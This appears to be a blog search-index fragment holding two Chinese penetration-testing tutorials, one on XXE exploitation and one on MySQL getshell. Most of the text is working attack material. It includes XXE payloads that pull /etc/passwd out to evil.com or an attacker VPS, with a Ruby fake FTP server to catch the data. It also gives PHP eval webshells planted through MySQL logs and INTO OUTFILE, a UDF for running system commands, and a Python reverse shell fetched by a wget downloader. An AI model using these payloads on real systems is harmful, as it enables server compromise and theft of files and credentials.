\u0026lt;svg width=\u0026#34;128px\u0026#34; height=\u0026#34;128px\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34; version=\u0026#34;1.1\u0026#34;\u0026gt; \u0026lt;text font-size=\u0026#34;16\u0026#34; x=\u0026#34;0\u0026#34; y=\u0026#34;16\u0026#34;\u0026gt;\u0026amp;xxe;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; 查看图片上是否有水印\n特殊技巧及绕过 技巧： 如果遇到php环境，有可能安装expect扩展，比较少见，但是成功可以直接RCE! \u0026lt;!ENTITY xxe SYSTEM \u0026#34;expect://id\u0026#34;\u0026gt; Excel/Word\n解压软件手动改容易破坏文件结构，建议使用Oxml_xxe这种专门的工具，编辑完xml后重新打包整个目录\n绕过： 技巧一： php的base64编码读取 ，为了应对读取的文件中包含特殊字符 \u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=/etc/passwd\u0026#34;\u0026gt; 技巧二： CDATA绕过 如果不能用 Base64（比如 Java 环境），读取包含 XML 特殊字符的文件会报错。可以使用 CDATA 包裹数据。 需要配合外部 DTD 配合，通常用于 Blind XXE 中读取复杂的配置文件（如 web.xml）。\n具体实现方法如下：\nvps上的web目录创建evil.dtd文件 \u0026lt;!ENTITY % start \u0026#34;\u0026lt;![CDATA[\u0026#34;\u0026gt; \u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % end \u0026#34;]]\u0026gt;\u0026#34;\u0026gt; \u0026lt;!ENTITY % all \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26; res \u0026#39;%start;%file;%end;\u0026#39;\u0026gt;\u0026#34;\u0026gt; 在目标网站发送请求 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % remote SYSTEM \u0026#34;http://evil.com/evil.dtd\u0026#34;\u0026gt; %remote; %all; ]\u0026gt; \u0026lt;root\u0026gt;\u0026amp;res;\u0026lt;/root\u0026gt; 原理解析：\n目标服务器读取并且解析xml，读取了dtd文件，在内存中：\n%start; 变成了 \u0026lt;![CDATA[ %file; 变成了 /etc/fstab 的真实内容 %end; 变成了 ]]\u0026gt; 执行 %all; 时，它在内部定义了一个普通的文本实体 \u0026amp;res;，其值为： \u0026lt;![CDATA[ ...文件内容... ]]\u0026gt;\n最后在 \u0026lt;root\u0026gt;\u0026amp;res;\u0026lt;/root\u0026gt; 中，由于内容被 CDATA 包裹，XML 解析器会直接把它当作一段文本输出，而不会因为文件里有 \u0026lt; 符号而报错。\n那这个时候又有一个问题，如果没有回显怎么办？\n方法一：\n报错注入，利用不完整的dtd文件诱发解析器错误，将读取到的内容显示在报错信息中，修改dtd内容如下：\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; error SYSTEM \u0026#39;file:///nonexistent/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %error; 服务器会因为找不到 /nonexistent/root:x:0... 这个文件而报错，而报错信息中就包含我们想要的信息\n方法二：\n利用FTP协议（java环境特有）\nJava 的 XML 解析器支持通过 FTP 协议外带数据。由于 FTP 允许传输包含换行和特殊字符的原始数据，这种方法比 HTTP 稳定得多。\n使用工具（如 ruby_ftp_server.rb）在 VPS 启动一个模拟 FTP 监听。\nPayload 修改为 SYSTEM \u0026quot;ftp://evil.com:21/%file;\u0026quot;。\n手动复现步骤如下：\n准备：需要一个能记录客户端 RETR 命令的“伪 FTP 服务器”\n在vps上启动伪FTP监听，运行脚本.rb\nrequire \u0026#39;socket\u0026#39; server = TCPServer.new 2121 # 监听2121端口 puts \u0026#34;Fake FTP server started on port 2121...\u0026#34; loop do Thread.start(server.accept) do |client| puts \u0026#34;Client connected.\u0026#34; client.puts \u0026#34;220 Fake FTP Server Ready\u0026#34; loop do gets = client.gets puts \u0026#34;Received: #{gets}\u0026#34; # 这里会打印出包含文件内容的请求 if gets.start_with? \u0026#34;USER\u0026#34; client.puts \u0026#34;331 Password required\u0026#34; elsif gets.start_with? \u0026#34;PASS\u0026#34; client.puts \u0026#34;230 User logged in\u0026#34; elsif gets.start_with? \u0026#34;RETR\u0026#34; client.puts \u0026#34;550 File not found\u0026#34; # 拒绝下载，但我们已经拿到了文件名 break else client.puts \u0026#34;200 OK\u0026#34; end end client.close end end 在vps上准备外部DTD文件\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfiltrate SYSTEM \u0026#39;ftp://47.x.x.x:2121/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfiltrate; 发送payload\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % remote SYSTEM \u0026#34;http://47.x.x.x/evil.dtd\u0026#34;\u0026gt; %remote; ]\u0026gt; \u0026lt;root\u0026gt;test\u0026lt;/root\u0026gt; 此时观察终端脚本的返回内容，就会返回想要的数据了\n如果以上方法都不行那还有一种方法：\n**技巧三：**DTD文件重写 原理：XML 允许在 DOCTYPE 中通过 INTERNAL SUBSET（内部子集）来重新定义已经在外部 DTD 中声明过的实体。并且解释器会优先使用我们的定义\n步骤如下：\n寻找DTD文件（常见路径如下） Linux (Ubuntu/Debian)/usr/share/xml/fontconfig/fonts.dtd Linux (RHEL/CentOS)/usr/share/sgml/docbook/xml-dtd-4.3-1.0-25.el7/ent/isogrk2.ent WindowsC:\\Windows\\System32\\wbem\\xml\\cim20.dtd Java 应用服务器很多自带的 Jar 包里也有，如 hibernate-mapping-3.0.dtd 验证：发送以下payload进行尝试\n\u0026lt;!DOCTYPE root SYSTEM \u0026#34;/usr/share/xml/fontconfig/fonts.dtd\u0026#34;\u0026gt; \u0026lt;root\u0026gt;test\u0026lt;/root\u0026gt; 构造payload\n假设我们确认目标服务器（Linux）存在 /usr/share/xml/fontconfig/fonts.dtd 这个文件。\n这个 fonts.dtd 内部定义了一个名为 constant 的实体。我们进行重写\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % local_dtd SYSTEM \u0026#34;file:///usr/share/xml/fontconfig/fonts.dtd\u0026#34;\u0026gt; \u0026lt;!ENTITY % constant \u0026#39; \u0026lt;!ENTITY \u0026amp;#x25; file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26;#x25; error SYSTEM \u0026amp;#x27;file:///nonexistent/\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026#34;\u0026gt; \u0026amp;#x25;eval; \u0026amp;#x25;error; \u0026#39;\u0026gt; %local_dtd; ]\u0026gt; \u0026lt;root\u0026gt;test\u0026lt;/root\u0026gt; 注意细节：\n三重转义：注意 \u0026amp;#x25;。这是因为我们在实体内部定义实体，又在嵌套内定义报错实体。每一层解析都需要多一重转义，否则 XML 解析器在第一层就会“炸掉”。\n引号问题：最外层用单引号 '，内部用双引号 \u0026quot;。\n","permalink":"http://localhost:1313/posts/xml/","summary":"\u003ch1 id=\"xml漏洞\"\u003eXML漏洞\u003c/h1\u003e\n\u003ch2 id=\"理论\"\u003e理论：\u003c/h2\u003e\n\u003cp\u003exml是一种用来传输和存储数据的格式，长得有些像HTML\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e\u0026lt;user\u0026gt;\n\t\u0026lt;username\u0026gt;admin\u0026lt;/username\u0026gt;\n\t\u0026lt;role\u0026gt;manager\u0026lt;/role\u0026gt;\n\u0026lt;/user\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e要学习XML就要先学习DTD\u003c/p\u003e\n\u003cp\u003e什么是DTD？\u003c/p\u003e\n\u003cp\u003eDTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是\u003cstrong\u003eEntity\u003c/strong\u003e，而他也就是漏洞的根源\u003c/p\u003e\n\u003cp\u003e他有些像编程语言中的变量，举两个例子\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e内部实体   \n\u0026lt;!DOCTYPE root [\n\t\u0026lt;!ENTITY name \u0026#34;h4xk0r\u0026#34;\u0026gt;\n]\u0026gt;\n\u0026lt;root\u0026gt;Hello \u0026amp;name;\u0026lt;/root\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据\n语法关键字 SYSTEM 或 PUBLIC\n\n\u0026lt;!DOCTYPE root[\n\t\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;\n]\u0026gt;\n\u0026lt;root\u0026gt;\u0026amp;xxe;\u0026lt;root\u0026gt;\n\n如果在实际过程中后端接收了你的XML，并且解析了\u0026amp;xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"实战向\"\u003e实战向：\u003c/h2\u003e\n\u003ch3 id=\"怎么去寻找漏洞点\"\u003e怎么去寻找漏洞点：\u003c/h3\u003e\n\u003cp\u003e显式的XML接口：\u003c/p\u003e\n\u003cp\u003e如果请求头是 \u003ccode\u003eContent-Type: application/xml\u003c/code\u003e 或 \u003ccode\u003etext/xml\u003c/code\u003e，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了\u003c/p\u003e\n\u003cp\u003e隐式接口（content-Type欺骗）：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e假设一个api接口是这样的：\nPOST /api/login HTTP/1.1\nContent-Type: application/json\n\n{\u0026#34;user\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;123\u0026#34;}\n\n很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload\n\nPOST /api/login HTTP/1.1\nContent-Type: application/xml  \u0026lt;-- 修改这里\n\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt;\n\u0026lt;user\u0026gt;admin\u0026lt;/user\u0026gt;\n\u0026lt;pass\u0026gt;123\u0026lt;/pass\u0026gt;\n\n如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e文件上传（SVG与office）\u0026ndash;这个是比较容易被忽视的点\u003c/p\u003e\n\u003cp\u003esvg： 是一种图片格式的矢量图。微信头像，网站logo上传处\u003c/p\u003e\n\u003cp\u003eExecl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处\u003c/p\u003e","title":"XML 漏洞详解"},{"content":"UDF (\u0026ndash;os-shell) 利用条件 数据库为DBA,可以使用sqlmap的--is-dba查看当前网站连接的数据库账户是否是管理员\nsecure_file_priv没有具体值\n查找:\r1. --sql-shell 1. 进入数据库后: SHOW VARS LIKE \u0026#39;secure_file_priv\u0026#39;;\r2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL 返回正常则null,无法写入\r页面异常则,则不是null\r判断是否为空:\r?id=1 AND length(@@secure_file_priv) = 0\t页面正常则为空\r3. 尝试写入文件: ?id=1 INTO OUTFILE \u0026#39;/var/www/html/test.txt\u0026#39; -- 根据报错信息判断\r4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=\u0026#39;FILE\u0026#39; AND grantee=CONCAT(\u0026#34;\u0026#39;\u0026#34;, (SELECT CURRENT_USER()), \u0026#34;\u0026#39;\u0026#34;)) IS NOT NULL\t即使secure_file_priv为空,用户没有FILE权限,也无法写入\r或者\rAND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。 知道网站的绝对路径\n查找:\r1. 注入报错信息\r2. 利用内部函数和元数据:\rApache (Ubuntu): UNION SELECT 1, load_file(\u0026#39;/etc/apache2/sites-enabled/000-default.conf\u0026#39;), 3\rNginx: UNION SELECT 1, load_file(\u0026#39;/etc/nginx/nginx.conf\u0026#39;), 3\rWindows (IIS): C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\r3.常见的默认路径:\rLinux (Apache)\t/var/www/html/, /var/www/www.example.com/\rLinux (Nginx)\t/usr/share/nginx/html/, /var/www/html/\rWindows (IIS)\tC:\\inetpub\\wwwroot\\\rWindows (XAMPP)\tC:\\xampp\\htdocs\\\rWindows (phpStudy)\tD:\\phpstudy_pro\\WWW\\, C:\\phpStudy\\WWW\\ 漏洞复现 方法一: \u0026ndash;os-shell\n方法二: 手动构造\n1. -- 查看架构（确定是 Windows/Linux 及 x64/x86）\rshow variables like \u0026#39;%compile%\u0026#39;; 2. -- 查看插件存放目录\rshow variables like \u0026#39;plugin_dir\u0026#39;;\r3. 准备udf文件: https://www.sqlsec.com/udf/\r4. 将文件写入插件目录(最好DUMPFILE,outfile也能写但是不处理换行符)\rSELECT 0x7f45... INTO DUMPFILE \u0026#39;/usr/lib/mysql/plugin/udf.so\u0026#39;;\r5. 创建关联函数\r-- 创建名为 sys_eval 的函数，关联到刚才上传的库文件\rCREATE FUNCTION sys_eval RETURNS STRING SONAME \u0026#39;udf.so\u0026#39;;\r6.执行系统命令\rSELECT sys_eval(\u0026#39;whoami\u0026#39;); 慢日志 getshell 利用条件 高权限(super或SYSTEM_CARIABLES_ADMIN)\n查看权限(MYSQL 8.0+ 引入的细分权限)\rSELECT * FROM information_schema.user_privileges WHERE grantee = CONCAT(\u0026#34;\u0026#39;\u0026#34;, CURRENT_USER(), \u0026#34;\u0026#39;\u0026#34;); 绝对路径: 知道web目录的绝对路径\n配置允许: 运行mysql的系统用户对Web目录有写入权限\n尝试写文件判断SELECT \u0026#39;test\u0026#39; INTO OUTFILE \u0026#39;/var/www/html/check.txt\u0026#39;; 漏洞复现 查询服务器默认时间\rshow global variables like \u0026#39;%long_query_time%\u0026#39;\rshow global variables like \u0026#39;%long%\u0026#39;\r查看慢日志参数\rshow global variables like \u0026#39;%slow%\u0026#39;\r开启慢日志\rSET GLOBAL slow_query_log = \u0026#39;ON\u0026#39;;\r修改日志路径为 Web 目录下的 PHP 文件\rSET GLOBAL slow_query_log_file = \u0026#39;C:/phpStudy/WWW/info.php\u0026#39;;\rSELECT \u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\u0026#39; or sleep(11)\t# 这里的时间必须超过慢日志的时间\r可以选择更改时间\rSET GLOBAL long_query_time = 1;\r测试连接: http://example/text.php general_log getshell 利用条件 高权限(root) 已知web根目录物理路径 对web目录有写入权限 介绍 相关参数一共有3个：general_log、log_output、general_log_file\rshow variables like \u0026#39;general_log\u0026#39;; # 查看日志是否开启\rset global general_log=on; # 开启日志功能\rshow variables like \u0026#39;general_log_file\u0026#39;; # 看看日志文件保存位置\rset global general_log_file=\u0026#39;C:/phpStudy/WWW/shell.php\u0026#39;; # 设置日志文件保存位置\rshow variables like \u0026#39;log_output\u0026#39;; -- 看看日志输出类型 table或file\rset global log_output=\u0026#39;table\u0026#39;; -- 设置输出类型为 table\rset global log_output=\u0026#39;file\u0026#39;; -- 设置输出类型为file\r一般log_output都是file,就是将日志存入文件中。table的话就是将日志存入数据库的日志表中。(table就会失败) 漏洞复现 set global general_log=\u0026#39;on\u0026#39;;\rset global general_log_file=\u0026#39;C:/phpStudy/WWW/shell.php\u0026#39;\rselect \u0026#39;\u0026lt;?php @eval($_POST[\u0026#39;pwd\u0026#39;]);?\u0026gt;\u0026#39;;\r# 测试\rhttp://example/shell.php into_outfile方法 getshell 利用条件 secure_file_priv为空 知道web绝对路径 必须有FILE权限 漏洞复现 \u0026#39; union select 1,2,3,\u0026#34;\u0026lt;?php system($_POST[\u0026#39;x\u0026#39;]);?\u0026gt;\u0026#34;,5,6,7,8 into outfile \u0026#39;/var/www/sqli_shell.php\u0026#39;# 远程加载拿shell 思路一 可以用来绕过文件字符过多失败\n利用sqlmap的文件写入,写了一个下载器 使用下载器连接vps下载真正的payload 反弹shell # 准备脚本\r//shell8888.py\rexport RHOST=\u0026#34;10.10.10.128\u0026#34;;export RPORT=8888;python -c \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\u0026#34;RHOST\u0026#34;),int(os.getenv(\u0026#34;RPORT\u0026#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;\r//get8888.php\r\u0026lt;?php system(\u0026#39;cd /tmp;wget http://10.10.10.128:81/shell8888.py;chmod +x shell8888.py;./shell8888.py\u0026#39;)?\u0026gt;\r# sqlmap上传get8888.php\r//上传shell\rsqlmap -u \u0026#39;http://10.10.10.100/login.php\u0026#39; --data=\u0026#39;email=admin\u0026amp;pass=admin\u0026amp;submit=Login\u0026#39; --file-write=\u0026#39;get8888.php\u0026#39; --file-dest=\u0026#39;/var/www/get8888.php\u0026#39;\r# 本地开启监听\rnc -lvvp 8888\r# 本地开启web下载服务\rphp -S 0:81\r# 浏览器远程访问加载get8888.php\rhttp://10.10.10.100/shell8888.py 思路二 当客户端(Web服务器)执行LOAD DATA LOCAL INFILE时,MySQL协议允许服务端请求客户端机器上的任何文件\n利用条件 关键条件：目标客户端（如 PHP 的 mysqli 或 PDO）必须开启了 local-infile 选项。 网络连通性： 目标服务器必须能访问外网（或你的 VPS IP）。 攻击步骤 部署恶意服务端：使用开源工具（如 Rogue-MySql-Server）在你的公网服务器上搭建。 配置读取路径： 在恶意服务端配置你想要读取的文件（如 /etc/passwd 或网站配置文件 config.php）。 触发连接： 方式 A： 目标网站有一个“配置远程数据库”的功能（如安装引导、后台数据库迁移）。 方式 B： 目标有 SSRF 漏洞，可以伪造请求连接你的 IP。 方式 C：目标有 SQL 注入，通过 LOAD DATA LOCAL INFILE 指令强制其连接你的服务器。 获取敏感信息：目标连接成功的一瞬间，它会自动把文件内容发送给你。 拿到 Shell：通过读取到的 config.php 获取其真正的数据库密码，或者找到源码泄露，再配合之前说的 into outfile 拿到 Shell。 思路三 利用Federated存储引擎(远程表映射)\n利用条件 引擎开启：默认情况下 MySQL 是不开启 FEDERATED 的，需在 my.cnf 配置。 权限： 需要有 CREATE TABLE 权限。 利用步骤 检测引擎: 执行SHOW ENGINES;,确认FEDERATED状态为yes vps准备: 在vps上创建一个真实的数据库和表,并在表中插入Webshell代码(十六进制) 建立映射: 在目标数据库执行CREATE TABLE,使用ENGINE=FEDERATED指向vps数据库 CREATE TABLE fake_table (cmd TEXT) ENGINE=FEDERATED CONNECTION=\u0026#39;mysql://evil_user:password@your_vps:3306/db/real_table\u0026#39;; 数据拉取与落地: 利用 INSERT INTO ... SELECT 将远程表中的木马内容导入到目标本地，并配合 INTO OUTFILE 导出。\nSELECT cmd FROM fake_table INTO OUTFILE \u0026#39;/var/www/html/shell.php\u0026#39;; 数据库备份 getshell 网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如asp/php/jsp/aspx等。\n而网站具有数据库备份功能，这时我们就可以将webshell格式先改为允许上传的文件格式，如jpg、gif等，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。\n","permalink":"http://localhost:1313/posts/mysql-getshell/","summary":"\u003ch2 id=\"udf--os-shell\"\u003eUDF  (\u0026ndash;os-shell)\u003c/h2\u003e\n\u003ch3 id=\"利用条件\"\u003e利用条件\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e数据库为DBA,可以使用sqlmap的\u003ccode\u003e--is-dba\u003c/code\u003e查看当前网站连接的数据库账户是否是管理员\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esecure_file_priv\u003c/code\u003e没有具体值\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e查找:\r\n1. --sql-shell \r\n1. 进入数据库后: SHOW VARS LIKE \u0026#39;secure_file_priv\u0026#39;;\r\n2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL \r\n\t返回正常则null,无法写入\r\n\t页面异常则,则不是null\r\n\t判断是否为空:\r\n\t?id=1 AND length(@@secure_file_priv) = 0\t页面正常则为空\r\n3. 尝试写入文件: ?id=1 INTO OUTFILE \u0026#39;/var/www/html/test.txt\u0026#39; -- 根据报错信息判断\r\n4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=\u0026#39;FILE\u0026#39; AND grantee=CONCAT(\u0026#34;\u0026#39;\u0026#34;, (SELECT CURRENT_USER()), \u0026#34;\u0026#39;\u0026#34;)) IS NOT NULL\t即使secure_file_priv为空,用户没有FILE权限,也无法写入\r\n或者\r\nAND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。\n\u003c/code\u003e\u003c/pre\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e知道网站的绝对路径\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e查找:\r\n1. 注入报错信息\r\n2. 利用内部函数和元数据:\r\nApache (Ubuntu):  UNION SELECT 1, load_file(\u0026#39;/etc/apache2/sites-enabled/000-default.conf\u0026#39;), 3\r\nNginx:               UNION SELECT 1, load_file(\u0026#39;/etc/nginx/nginx.conf\u0026#39;), 3\r\nWindows (IIS):       C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\r\n3.常见的默认路径:\r\nLinux (Apache)\t/var/www/html/, /var/www/www.example.com/\r\nLinux (Nginx)\t/usr/share/nginx/html/, /var/www/html/\r\nWindows (IIS)\tC:\\inetpub\\wwwroot\\\r\nWindows (XAMPP)\tC:\\xampp\\htdocs\\\r\nWindows (phpStudy)\tD:\\phpstudy_pro\\WWW\\, C:\\phpStudy\\WWW\\\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"漏洞复现\"\u003e漏洞复现\u003c/h3\u003e\n\u003cp\u003e方法一: \u0026ndash;os-shell\u003c/p\u003e","title":"MySQL getshell"}]